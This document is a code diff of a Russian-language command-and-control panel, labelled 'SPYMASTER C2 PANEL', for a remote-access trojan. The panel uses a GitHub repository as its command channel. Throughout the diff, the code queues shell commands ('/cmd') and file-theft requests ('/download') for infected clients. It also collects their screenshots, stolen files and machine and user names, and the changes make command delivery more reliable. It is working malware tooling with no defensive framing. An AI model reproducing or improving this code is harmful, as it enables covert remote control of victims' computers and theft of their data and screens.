@@ -1,6 +1,5 @@
-// ============= SPYMASTER C2 PANEL - ИСПРАВЛЕННАЯ ВЕРСИЯ =============
+// ============= SPYMASTER C2 PANEL - СТАБИЛЬНАЯ ВЕРСИЯ =============
 // АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ
-// FIX: УЛУЧШЕННАЯ ОТПРАВКА КОМАНД + ПРОВЕРКА
 
 // ============= КОНФИГУРАЦИЯ =============
 let GITHUB_USERNAME = "твой_логин";
@@ -46,326 +45,8 @@ let clients = [];
 let seenFiles = [];
 let autoRefresh = null;
 let currentClient = "all";
-let lastCommandTime = 0;
-let pendingCommands = [];
 
-// ============= ФУНКЦИЯ ОТПРАВКИ КОМАНДЫ (С ПОВТОРАМИ) =============
-async function sendCommandWithRetry(command, retries = 3, delay = 1000) {
-    for (let i = 0; i < retries; i++) {
-        try {
-            const result = await sendCommandToGithub(command);
-            if (result) {
-                addLog(`✅ КОМАНДА ОТПРАВЛЕНА: ${command} (попытка ${i+1})`, "success");
-                return true;
-            }
-        } catch (error) {
-            addLog(`⚠️ ПОВТОР ${i+1}/${retries}: ${error.message}`, "error");
-            await new Promise(r => setTimeout(r, delay));
-        }
-    }
-    addLog(`❌ НЕ УДАЛОСЬ ОТПРАВИТЬ КОМАНДУ: ${command}`, "error");
-    return false;
-}
-
-// ============= ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ =============
-async function sendCommandToGithub(command) {
-    if (!command) return false;
-    
-    const targetClient = currentClient || "all";
-    let finalCommand = command;
-    if (targetClient !== "all") {
-        finalCommand = `@${targetClient} ${command}`;
-    }
-    
-    addLog(`📨 ОТПРАВКА: ${finalCommand}`, "system");
-    
-    try {
-        // 1. Сначала пытаемся создать новый файл (более надёжно)
-        const timestamp = Date.now();
-        const tempFile = `temp_cmd_${timestamp}.txt`;
-        
-        // Пробуем создать временный файл с командой
-        const tempData = {
-            message: `temp_command_${timestamp}`,
-            content: btoa(unescape(encodeURIComponent(finalCommand + "\n"))),
-            branch: "main"
-        };
-        
-        let tempResult = await githubRequest(`${API_URL}/${tempFile}`, "PUT", tempData);
-        
-        if (tempResult && (tempResult.status === 201 || tempResult.status === 200)) {
-            addLog(`📝 ВРЕМЕННЫЙ ФАЙЛ СОЗДАН: ${tempFile}`, "success");
-            
-            // 2. Через секунду добавляем команду в основной файл
-            await new Promise(r => setTimeout(r, 500));
-            
-            // Получаем текущий commands.txt
-            let response = await githubRequest(`${API_URL}/commands.txt`);
-            
-            let currentContent = "";
-            let sha = null;
-            
-            if (response && response.content) {
-                currentContent = atob(response.content);
-                sha = response.sha;
-                addLog(`📖 ТЕКУЩИЕ КОМАНДЫ: ${currentContent || "(пусто)"}`, "system");
-            }
-            
-            const newContent = currentContent + finalCommand + "\n";
-            const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
-            
-            const putData = {
-                message: `Command: ${command}`,
-                content: encodedContent,
-                branch: "main"
-            };
-            if (sha) putData.sha = sha;
-            
-            const mainResult = await githubRequest(`${API_URL}/commands.txt`, "PUT", putData);
-            
-            if (mainResult && (mainResult.status === 201 || mainResult.status === 200 || mainResult.commit)) {
-                addLog(`✅ КОМАНДА ЗАПИСАНА: ${command}`, "success");
-                
-                // 3. Удаляем временный файл
-                await new Promise(r => setTimeout(r, 300));
-                if (tempResult && tempResult.sha) {
-                    const deleteData = {
-                        message: `delete_temp_${timestamp}`,
-                        sha: tempResult.sha,
-                        branch: "main"
-                    };
-                    await githubRequest(`${API_URL}/${tempFile}`, "DELETE", deleteData);
-                    addLog(`🗑 ВРЕМЕННЫЙ ФАЙЛ УДАЛЁН`, "system");
-                }
-                
-                return true;
-            }
-        }
-        
-        // Если временный файл не сработал - пробуем прямой метод
-        addLog(`🔄 ПРОБУЮ ПРЯМОЙ МЕТОД...`, "system");
-        
-        let response = await githubRequest(`${API_URL}/commands.txt`);
-        let currentContent = "";
-        let sha = null;
-        
-        if (response && response.content) {
-            currentContent = atob(response.content);
-            sha = response.sha;
-        }
-        
-        const newContent = currentContent + finalCommand + "\n";
-        const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
-        
-        const putData = {
-            message: `Command: ${command}`,
-            content: encodedContent,
-            branch: "main"
-        };
-        if (sha) putData.sha = sha;
-        
-        const result = await githubRequest(`${API_URL}/commands.txt`, "PUT", putData);
-        
-        if (result && (result.status === 201 || result.status === 200 || result.commit)) {
-            addLog(`✅ КОМАНДА ЗАПИСАНА (прямой метод): ${command}`, "success");
-            return true;
-        }
-        
-        return false;
-        
-    } catch (error) {
-        addLog(`❌ ОШИБКА ОТПРАВКИ: ${error.message}`, "error");
-        return false;
-    }
-}
-
-// ============= ФУНКЦИЯ ПРОВЕРКИ commands.txt =============
-async function verifyCommandsFile() {
-    try {
-        const response = await githubRequest(`${API_URL}/commands.txt`);
-        if (response && response.content) {
-            const content = atob(response.content);
-            addLog(`🔍 ПРОВЕРКА commands.txt: ${content || "(пусто)"}`, "system");
-            return content;
-        } else {
-            addLog(`⚠️ ФАЙЛ commands.txt НЕ СУЩЕСТВУЕТ`, "warning");
-            // Создаём пустой файл
-            const createData = {
-                message: "init commands",
-                content: btoa(""),
-                branch: "main"
-            };
-            await githubRequest(`${API_URL}/commands.txt`, "PUT", createData);
-            addLog(`📝 СОЗДАН ПУСТОЙ commands.txt`, "success");
-            return "";
-        }
-    } catch (error) {
-        addLog(`❌ ОШИБКА ПРОВЕРКИ: ${error.message}`, "error");
-        return null;
-    }
-}
-
-// ============= УЛУЧШЕННАЯ ОТПРАВКА КОМАНДЫ (ВНЕШНЯЯ) =============
-async function sendCommand(command, clientId = null) {
-    if (!command) return;
-    
-    const targetClient = clientId || currentClient || "all";
-    addLog(`🎯 ОТПРАВКА КОМАНДЫ: ${command}`, "system");
-    
-    // Показываем индикатор отправки
-    showSendingIndicator(true);
-    
-    // Проверяем что commands.txt существует
-    await verifyCommandsFile();
-    
-    // Отправляем команду
-    const result = await sendCommandWithRetry(command, 3, 1000);
-    
-    if (result) {
-        showNotification(`✅ Команда отправлена: ${command}`, "success");
-        // Обновляем список команд через 1 секунду
-        setTimeout(() => verifyCommandsFile(), 1000);
-    } else {
-        showNotification(`❌ Ошибка отправки: ${command}`, "error");
-    }
-    
-    showSendingIndicator(false);
-}
-
-// ============= ИНДИКАТОР ОТПРАВКИ =============
-function showSendingIndicator(show) {
-    let indicator = document.getElementById("sendingIndicator");
-    if (!indicator) {
-        indicator = document.createElement("div");
-        indicator.id = "sendingIndicator";
-        indicator.style.cssText = `
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background: #ff8800;
-            color: #fff;
-            padding: 8px 15px;
-            border-radius: 5px;
-            font-family: monospace;
-            font-size: 12px;
-            z-index: 1000;
-            display: none;
-        `;
-        indicator.innerHTML = "⏳ ОТПРАВКА...";
-        document.body.appendChild(indicator);
-    }
-    indicator.style.display = show ? "block" : "none";
-}
-
-// ============= ОБНОВЛЁННАЯ ФУНКЦИЯ githubRequest =============
-async function githubRequest(url, method = "GET", data = null) {
-    if (!GITHUB_TOKEN) {
-        addLog("❌ ТОКЕН НЕ ЗАДАН!", "error");
-        return null;
-    }
-    
-    try {
-        const options = {
-            method: method,
-            headers: HEADERS
-        };
-        
-        if (data && (method === "PUT" || method === "DELETE")) {
-            options.body = JSON.stringify(data);
-        }
-        
-        const response = await fetch(url, options);
-        const result = await response.json();
-        
-        // Добавляем статус в результат для удобства
-        result.status = response.status;
-        
-        if (response.status === 401) {
-            addLog("❌ ОШИБКА АВТОРИЗАЦИИ! Токен неверный", "error");
-            return null;
-        }
-        
-        if (response.status === 409) {
-            addLog("⚠️ КОНФЛИКТ (409) - повторяю запрос", "warning");
-            // При конфликте пробуем получить свежие данные
-            await new Promise(r => setTimeout(r, 500));
-            const retryResponse = await fetch(url, options);
-            return await retryResponse.json();
-        }
-        
-        if (response.status === 404 && method !== "PUT") {
-            return null;
-        }
-        
-        if (response.status === 403) {
-            addLog("⚠️ ЛИМИТ ЗАПРОСОВ! Подождите", "warning");
-            return null;
-        }
-        
-        return result;
-        
-    } catch (error) {
-        addLog(`❌ ОШИБКА: ${error.message}`, "error");
-        return null;
-    }
-}
-
-// ============= УЛУЧШЕННАЯ ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
-async function loadResults() {
-    try {
-        const response = await githubRequest(API_URL);
-        if (!response || !Array.isArray(response)) return;
-        
-        const results = response.filter(f => f.name.startsWith("result_"));
-        const screenshots = response.filter(f => f.name.startsWith("screenshot_"));
-        const files = response.filter(f => f.name.startsWith("file_"));
-        
-        // Обновляем статистику
-        document.getElementById("resultsCount").innerText = results.length;
-        document.getElementById("screensCount").innerText = screenshots.length;
-        document.getElementById("clientsCount").innerText = clients.length;
-        
-        // Обрабатываем новые результаты
-        for (const file of [...results, ...screenshots, ...files]) {
-            if (!seenFiles.includes(file.name)) {
-                seenFiles.push(file.name);
-                
-                if (file.name.startsWith("result_")) {
-                    try {
-                        const content = await fetch(file.download_url + "?t=" + Date.now()).then(r => r.text());
-                        addLog(`📥 НОВЫЙ РЕЗУЛЬТАТ: ${file.name}`, "result");
-                        const lines = content.split('\n').slice(0, 10);
-                        for (const line of lines) {
-                            if (line.trim()) addLog(`   ${line}`, "result");
-                        }
-                        parseClientInfo(content);
-                    } catch(e) {
-                        addLog(`⚠️ Не удалось прочитать ${file.name}`, "error");
-                    }
-                }
-                
-                if (file.name.startsWith("screenshot_")) {
-                    addLog(`📸 НОВЫЙ СКРИНШОТ: ${file.name}`, "success");
-                    updateScreensGrid();
-                }
-                
-                if (file.name.startsWith("file_")) {
-                    addLog(`📁 НОВЫЙ ФАЙЛ: ${file.name}`, "success");
-                    updateFilesList();
-                }
-            }
-        }
-        
-        updateClientsList();
-        updateScreensGrid();
-        updateFilesList();
-        
-    } catch (error) {
-        addLog(`❌ Ошибка загрузки: ${error.message}`, "error");
-    }
-}
-
-// ============= ОСТАЛЬНЫЕ ФУНКЦИИ (ОСТАЮТСЯ БЕЗ ИЗМЕНЕНИЙ) =============
+// ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
 function addLog(message, type = "system") {
     const logContainer = document.getElementById("logContainer");
     const time = new Date().toLocaleTimeString();
@@ -398,160 +79,224 @@ function showNotification(message, type = "info") {
     setTimeout(() => notification.remove(), 3000);
 }
 
-function parseClientInfo(content) {
-    if (content.includes("[Connected]") || content.includes("PC:")) {
-        const pcMatch = content.match(/PC:\s*([^\n]+)/);
-        const userMatch = content.match(/User:\s*([^\n]+)/);
+// ============= ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ КОМАНД =============
+async function sendCommand(command, clientId = null) {
+    if (!command) return;
+    
+    const targetClient = clientId || currentClient || "all";
+    let finalCommand = command;
+    if (targetClient !== "all") {
+        finalCommand = `@${targetClient} ${command}`;
+    }
+    
+    addLog(`📨 ОТПРАВКА: ${finalCommand}`, "system");
+    showSendingIndicator(true);
+    
+    try {
+        // Отключаем кэширование
+        const cacheBuster = `?t=${Date.now()}&_=${Math.random()}`;
         
-        if (pcMatch) {
-            const clientId = pcMatch[1].trim();
-            if (!clients.find(c => c.id === clientId)) {
-                clients.push({
-                    id: clientId,
-                    user: userMatch ? userMatch[1].trim() : "Unknown",
-                    firstSeen: new Date().toLocaleString()
+        // Получаем текущий commands.txt с актуальным SHA
+        let response = await fetch(`${API_URL}/commands.txt${cacheBuster}`, {
+            headers: HEADERS,
+            cache: 'no-store'
+        });
+        
+        let currentContent = "";
+        let sha = null;
+        
+        if (response.status === 200) {
+            const data = await response.json();
+            currentContent = atob(data.content);
+            sha = data.sha;
+            addLog(`📖 ТЕКУЩИЙ SHA: ${sha.substring(0, 8)}...`, "system");
+        } else if (response.status === 404) {
+            addLog(`📝 ФАЙЛ commands.txt НЕ СУЩЕСТВУЕТ, СОЗДАЮ...`, "system");
+        } else {
+            addLog(`❌ ОШИБКА: ${response.status}`, "error");
+            showSendingIndicator(false);
+            return;
+        }
+        
+        // Добавляем команду с временной меткой
+        const newContent = currentContent + finalCommand + " #" + Date.now() + "\n";
+        const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
+        
+        const putData = {
+            message: `Command: ${command}`,
+            content: encodedContent,
+            branch: "main"
+        };
+        if (sha) putData.sha = sha;
+        
+        // Отправляем с повторными попытками
+        let success = false;
+        for (let attempt = 1; attempt <= 3; attempt++) {
+            try {
+                const putResponse = await fetch(`${API_URL}/commands.txt`, {
+                    method: "PUT",
+                    headers: HEADERS,
+                    body: JSON.stringify(putData)
                 });
-                addLog(`💻 НОВЫЙ КЛИЕНТ: ${clientId}`, "client");
-                showNotification(`Новый клиент: ${clientId}`, "success");
+                
+                if (putResponse.status === 200 || putResponse.status === 201) {
+                    addLog(`✅ КОМАНДА ОТПРАВЛЕНА! (попытка ${attempt})`, "success");
+                    showNotification(`✅ Команда отправлена: ${command}`, "success");
+                    success = true;
+                    break;
+                } else if (putResponse.status === 409) {
+                    addLog(`⚠️ КОНФЛИКТ (409), ОБНОВЛЯЮ SHA... (попытка ${attempt})`, "warning");
+                    // Получаем свежий SHA
+                    const freshResponse = await fetch(`${API_URL}/commands.txt${cacheBuster}`, {
+                        headers: HEADERS,
+                        cache: 'no-store'
+                    });
+                    if (freshResponse.status === 200) {
+                        const freshData = await freshResponse.json();
+                        putData.sha = freshData.sha;
+                        continue;
+                    }
+                } else {
+                    addLog(`❌ ОШИБКА: ${putResponse.status} (попытка ${attempt})`, "error");
+                }
+            } catch (err) {
+                addLog(`⚠️ ОШИБКА: ${err.message} (попытка ${attempt})`, "error");
+            }
+            
+            if (attempt < 3) await new Promise(r => setTimeout(r, 1000));
+        }
+        
+        if (!success) {
+            addLog(`❌ НЕ УДАЛОСЬ ОТПРАВИТЬ КОМАНДУ ПОСЛЕ 3 ПОПЫТОК`, "error");
+            showNotification(`❌ Ошибка отправки: ${command}`, "error");
+        }
+        
+    } catch (error) {
+        addLog(`❌ КРИТИЧЕСКАЯ ОШИБКА: ${error.message}`, "error");
+        showNotification(`❌ Ошибка: ${error.message}`, "error");
+    }
+    
+    showSendingIndicator(false);
+}
+
+// ============= ИНДИКАТОР ОТПРАВКИ =============
+function showSendingIndicator(show) {
+    let indicator = document.getElementById("sendingIndicator");
+    if (!indicator) {
+        indicator = document.createElement("div");
+        indicator.id = "sendingIndicator";
+        indicator.style.cssText = `
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #ff8800;
+            color: #fff;
+            padding: 8px 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            z-index: 1000;
+            display: none;
+        `;
+        indicator.innerHTML = "⏳ ОТПРАВКА...";
+        document.body.appendChild(indicator);
+    }
+    indicator.style.display = show ? "block" : "none";
+}
+
+// ============= ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
+async function loadResults() {
+    try {
+        const cacheBuster = `?t=${Date.now()}`;
+        const response = await fetch(`${API_URL}${cacheBuster}`, { headers: HEADERS });
+        if (!response.ok) return;
+        
+        const files = await response.json();
+        if (!Array.isArray(files)) return;
+        
+        const results = files.filter(f => f.name.startsWith("result_"));
+        const screenshots = files.filter(f => f.name.startsWith("screenshot_"));
+        
+        document.getElementById("resultsCount").innerText = results.length;
+        document.getElementById("screensCount").innerText = screenshots.length;
+        document.getElementById("clientsCount").innerText = clients.length;
+        
+        // Обрабатываем новые результаты
+        for (const file of results) {
+            if (!seenFiles.includes(file.name)) {
+                seenFiles.push(file.name);
+                const content = await fetch(file.download_url + cacheBuster).then(r => r.text());
+                addLog(`📥 ${file.name}`, "result");
+                const lines = content.split('\n').slice(0, 5);
+                for (const line of lines) {
+                    if (line.trim()) addLog(`   ${line.substring(0, 100)}`, "result");
+                }
+                
+                // Парсим нового клиента
+                if (content.includes("PC:")) {
+                    const pcMatch = content.match(/PC:\s*([^\n]+)/);
+                    const userMatch = content.match(/User:\s*([^\n]+)/);
+                    if (pcMatch && !clients.find(c => c.id === pcMatch[1])) {
+                        clients.push({
+                            id: pcMatch[1],
+                            user: userMatch ? userMatch[1] : "Unknown",
+                            firstSeen: new Date().toLocaleString()
+                        });
+                        updateClientsList();
+                        addLog(`💻 НОВЫЙ КЛИЕНТ: ${pcMatch[1]}`, "client");
+                    }
+                }
             }
         }
-    }
-}
-
-// ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
-function escapeHtml(text) {
-    const div = document.createElement('div');
-    div.textContent = text;
-    return div.innerHTML;
-}
-
-function formatFileSize(bytes) {
-    if (bytes < 1024) return bytes + " B";
-    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + " KB";
-    return (bytes / (1024 * 1024)).toFixed(1) + " MB";
-}
-
-function showModal(imageUrl, title) {
-    let modal = document.getElementById("imageModal");
-    if (!modal) {
-        modal = document.createElement("div");
-        modal.id = "imageModal";
-        modal.className = "modal";
-        modal.innerHTML = `
-            <span class="modal-close">&times;</span>
-            <div class="modal-content">
-                <div class="modal-title"></div>
-                <img src="" alt="Screenshot">
-            </div>
-        `;
-        document.body.appendChild(modal);
-        modal.querySelector(".modal-close").onclick = () => modal.classList.remove("active");
-        modal.onclick = (e) => { if (e.target === modal) modal.classList.remove("active"); };
-    }
-    modal.querySelector("img").src = imageUrl;
-    modal.querySelector(".modal-title").innerHTML = title || "Скриншот";
-    modal.classList.add("active");
-}
-
-async function updateScreensGrid() {
-    const response = await githubRequest(API_URL);
-    if (!response || !Array.isArray(response)) return;
-    const screenshots = response.filter(f => f.name.startsWith("screenshot_")).reverse();
-    const grid = document.getElementById("screensGrid");
-    if (screenshots.length === 0) {
-        grid.innerHTML = '<div class="empty-message">📭 Нет скриншотов</div>';
-        return;
-    }
-    grid.innerHTML = "";
-    for (const screenshot of screenshots) {
-        const card = document.createElement("div");
-        card.className = "screenshot-card";
-        card.onclick = () => showModal(screenshot.download_url, screenshot.name);
-        card.innerHTML = `<img src="${screenshot.download_url}?t=${Date.now()}" alt="${screenshot.name}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'200\' height=\'150\'%3E%3Crect width=\'200\' height=\'150\' fill=\'%230a0e27\'/%3E%3Ctext x=\'100\' y=\'75\' fill=\'%2300ff41\' text-anchor=\'middle\'%3E📸 ${screenshot.name}%3C/text%3E%3C/svg%3E'"><div class="info">📸 ${screenshot.name}</div>`;
-        grid.appendChild(card);
-    }
-}
-
-async function updateFilesList() {
-    const response = await githubRequest(API_URL);
-    if (!response || !Array.isArray(response)) return;
-    const files = response.filter(f => f.name.startsWith("file_")).reverse();
-    const list = document.getElementById("filesList");
-    if (files.length === 0) {
-        list.innerHTML = '<div class="empty-message">📭 Нет загруженных файлов</div>';
-        return;
-    }
-    list.innerHTML = "";
-    for (const file of files) {
-        const item = document.createElement("div");
-        item.className = "file-item";
-        const fileSize = file.size ? formatFileSize(file.size) : "?";
-        item.innerHTML = `<span class="file-name">📄 ${escapeHtml(file.name)} (${fileSize})</span><button class="file-download" onclick="window.open('${file.download_url}', '_blank')">⬇️ СКАЧАТЬ</button>`;
-        list.appendChild(item);
+        
+        // Обновляем скриншоты
+        const grid = document.getElementById("screensGrid");
+        if (grid && screenshots.length > 0) {
+            grid.innerHTML = "";
+            for (const shot of screenshots.slice(-6).reverse()) {
+                const card = document.createElement("div");
+                card.className = "screenshot-card";
+                card.onclick = () => window.open(shot.download_url, '_blank');
+                card.innerHTML = `<img src="${shot.download_url}${cacheBuster}" style="width:100%;height:100px;object-fit:cover"><div style="padding:5px;font-size:10px">${shot.name}</div>`;
+                grid.appendChild(card);
+            }
+        }
+        
+    } catch (error) {
+        addLog(`❌ Ошибка загрузки: ${error.message}`, "error");
     }
 }
 
 function updateClientsList() {
     const select = document.getElementById("clientSelect");
-    const clientsDiv = document.getElementById("clientsList");
+    if (!select) return;
     select.innerHTML = '<option value="all">📱 ВСЕ КЛИЕНТЫ</option>';
-    if (clients.length === 0) {
-        clientsDiv.innerHTML = '<div class="empty-message">💤 Нет подключенных клиентов</div>';
-        return;
-    }
-    clientsDiv.innerHTML = "";
     for (const client of clients) {
         select.innerHTML += `<option value="${client.id}">🖥️ ${client.id}</option>`;
-        const clientCard = document.createElement("div");
-        clientCard.className = "client-card";
-        clientCard.setAttribute("data-client", client.id);
-        clientCard.onclick = () => {
-            document.querySelectorAll(".client-card").forEach(c => c.classList.remove("selected"));
-            clientCard.classList.add("selected");
-            document.getElementById("clientSelect").value = client.id;
-            currentClient = client.id;
-            addLog(`🎯 ВЫБРАН КЛИЕНТ: ${client.id}`, "success");
-        };
-        clientCard.innerHTML = `<div class="client-name">🖥️ ${escapeHtml(client.id)}</div><div class="client-info">👤 ${escapeHtml(client.user)}</div><div class="client-time">🕐 Подключен: ${escapeHtml(client.firstSeen)}</div>`;
-        clientsDiv.appendChild(clientCard);
     }
 }
 
 async function clearCommands() {
     try {
-        const url = `${API_URL}/commands.txt`;
-        const response = await githubRequest(url);
-        if (response && response.sha) {
-            const putData = { message: "Clear commands", content: btoa(""), sha: response.sha, branch: "main" };
-            await githubRequest(url, "PUT", putData);
+        const cacheBuster = `?t=${Date.now()}`;
+        const response = await fetch(`${API_URL}/commands.txt${cacheBuster}`, { headers: HEADERS });
+        if (response.status === 200) {
+            const data = await response.json();
+            const deleteData = {
+                message: "Clear commands",
+                content: btoa(""),
+                sha: data.sha,
+                branch: "main"
+            };
+            await fetch(`${API_URL}/commands.txt`, {
+                method: "PUT",
+                headers: HEADERS,
+                body: JSON.stringify(deleteData)
+            });
             addLog("🗑 КОМАНДЫ ОЧИЩЕНЫ", "success");
         }
     } catch (error) {
         addLog(`❌ Ошибка очистки: ${error.message}`, "error");
-    }
-}
-
-async function clearAllFiles() {
-    if (!confirm("💣 Удалить ВСЕ файлы? Файлы сайта НЕ будут затронуты!")) return;
-    try {
-        const response = await githubRequest(API_URL);
-        if (response && Array.isArray(response)) {
-            const protectedFiles = ["index.html", "style.css", "script.js", "config.js", ".gitignore"];
-            let deleted = 0;
-            for (const file of response) {
-                if (protectedFiles.includes(file.name)) continue;
-                const deleteData = { message: `Delete ${file.name}`, sha: file.sha, branch: "main" };
-                await githubRequest(`${API_URL}/${file.name}`, "DELETE", deleteData);
-                deleted++;
-                await new Promise(r => setTimeout(r, 100));
-            }
-            addLog(`💣 УДАЛЕНО: ${deleted} файлов`, "success");
-            seenFiles = [];
-            clients = [];
-            loadResults();
-        }
-    } catch (error) {
-        addLog(`❌ Ошибка: ${error.message}`, "error");
     }
 }
 
@@ -564,7 +309,6 @@ async function testConnection() {
             addLog(`✅ ПОДКЛЮЧЕНО! ПОЛЬЗОВАТЕЛЬ: ${user.login}`, "success");
             document.getElementById("statusIndicator").classList.add("online");
             document.getElementById("statusText").innerHTML = `✅ ПОДКЛЮЧЕН | ${user.login}`;
-            await verifyCommandsFile();
             return true;
         } else {
             addLog(`❌ ОШИБКА: ${response.status}`, "error");
@@ -578,50 +322,62 @@ async function testConnection() {
 
 function startAutoRefresh() {
     if (autoRefresh) clearInterval(autoRefresh);
-    autoRefresh = setInterval(() => loadResults(), 5000);
-    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО", "system");
+    autoRefresh = setInterval(() => loadResults(), 8000);
+    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО (8 сек)", "system");
 }
 
 // ============= ИНИЦИАЛИЗАЦИЯ =============
 async function init() {
-    addLog("🐀 SPYMASTER C2 PANEL v5.0 (FIXED)", "system");
+    addLog("🐀 SPYMASTER C2 PANEL v5.0", "system");
     addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system");
     
     // Добавляем стили
-    const style = document.createElement('style');
-    style.textContent = `@keyframes fadeInOut { 0% { opacity: 0; transform: translateX(20px); } 15% { opacity: 1; transform: translateX(0); } 85% { opacity: 1; transform: translateX(0); } 100% { opacity: 0; transform: translateX(20px); } }.modal.active { display: flex !important; } .modal-content { position: relative; max-width: 90%; max-height: 90%; } .modal-title { color: #00ff41; font-family: monospace; padding: 10px; text-align: center; background: #0a0e27; border: 1px solid #00ff41; border-radius: 8px 8px 0 0; } .modal img { max-width: 100%; max-height: calc(90vh - 50px); border: 1px solid #00ff41; border-radius: 0 0 8px 8px; }`;
-    document.head.appendChild(style);
+    if (!document.querySelector("#dynamic-styles")) {
+        const style = document.createElement('style');
+        style.id = "dynamic-styles";
+        style.textContent = `
+            @keyframes fadeInOut { 0% { opacity: 0; transform: translateX(20px); } 15% { opacity: 1; transform: translateX(0); } 85% { opacity: 1; transform: translateX(0); } 100% { opacity: 0; transform: translateX(20px); } }
+            .log-entry.success { border-left-color: #00ff41; color: #00ff41; }
+            .log-entry.error { border-left-color: #ff4444; color: #ff8888; }
+            .log-entry.system { border-left-color: #ffaa00; color: #ffaa88; }
+            .log-entry.client { border-left-color: #00aaff; color: #88ccff; }
+            .log-entry.result { border-left-color: #aa44ff; color: #cc88ff; }
+            .log-entry { background: #0a0e27; border-radius: 3px; margin-bottom: 5px; padding: 5px 10px; border-left: 3px solid; font-family: monospace; font-size: 12px; }
+        `;
+        document.head.appendChild(style);
+    }
     
     await testConnection();
     startAutoRefresh();
-    await verifyCommandsFile();
+    await loadResults();
     
     // Привязываем кнопки
-    document.querySelectorAll(".cmd-btn").forEach(btn => {
-        btn.addEventListener("click", () => sendCommand(btn.getAttribute("data-cmd")));
-    });
-    document.querySelectorAll(".cmd-small").forEach(btn => {
-        if (!btn.id) btn.addEventListener("click", () => sendCommand(btn.getAttribute("data-cmd")));
+    document.querySelectorAll(".cmd-btn, .cmd-small").forEach(btn => {
+        if (btn.id !== "sendCustomBtn" && btn.id !== "downloadBtn" && btn.id !== "shellBtn") {
+            btn.addEventListener("click", () => {
+                const cmd = btn.getAttribute("data-cmd");
+                if (cmd) sendCommand(cmd);
+            });
+        }
     });
     
     document.getElementById("sendCustomBtn")?.addEventListener("click", () => {
-        const cmd = document.getElementById("customCmd").value;
+        const cmd = document.getElementById("customCmd")?.value;
         if (cmd) sendCommand(cmd);
-        document.getElementById("customCmd").value = "";
+        if (document.getElementById("customCmd")) document.getElementById("customCmd").value = "";
     });
     
     document.getElementById("downloadBtn")?.addEventListener("click", () => {
-        const path = document.getElementById("downloadPath").value;
+        const path = document.getElementById("downloadPath")?.value;
         if (path) sendCommand(`/download ${path}`);
     });
     
     document.getElementById("shellBtn")?.addEventListener("click", () => {
-        const cmd = document.getElementById("shellCmd").value;
+        const cmd = document.getElementById("shellCmd")?.value;
         if (cmd) sendCommand(`/cmd ${cmd}`);
     });
     
     document.getElementById("clearCommandsBtn")?.addEventListener("click", clearCommands);
-    document.getElementById("clearAllBtn")?.addEventListener("click", clearAllFiles);
     document.getElementById("refreshBtn")?.addEventListener("click", () => loadResults());
     
     document.getElementById("clientSelect")?.addEventListener("change", (e) => {
